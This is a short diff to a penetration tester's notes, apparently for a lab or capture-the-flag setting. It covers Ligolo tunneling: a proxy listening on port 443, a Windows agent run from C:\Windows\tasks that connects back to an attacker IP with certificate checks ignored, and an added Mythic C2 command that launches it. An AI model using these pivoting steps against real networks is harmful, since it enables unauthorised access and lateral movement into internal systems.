@@ -19,7 +19,7 @@ There's two parts: a proxy server running on our attack machine, and agents runn
 
 We can setup our proxy server like so, to add the ligolo interface, set it up, and then run the proxy server, which will listen on port 443 for connections.
 ```bash
-sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && sudo ./proxy -selfcert -laddr 0.0.0.0:443
+sudo ip tuntap add user kali mode tun ligolo ; sudo ip link set ligolo up && sudo ./ligolo-proxy-server -selfcert -laddr 0.0.0.0:443
 
 
 ```
@@ -28,7 +28,10 @@ We can run the agent (after uploading it) with
 ```cmd
 C:\Windows\tasks\ligolo-windows-agent.exe -connect 10.10.16.157:443 -ignore-cert
 ```
-
+If we're in Mythic, we can use
+```
+run -Executable C:\Windows\tasks\ligolo-windows-agent.exe -Arguments "-connect 10.10.16.157:443 -ignore-cert"
+```
 
 ## Autoroute
 We need to add the internal IP range so that it gets routed. We can use autoroute for this
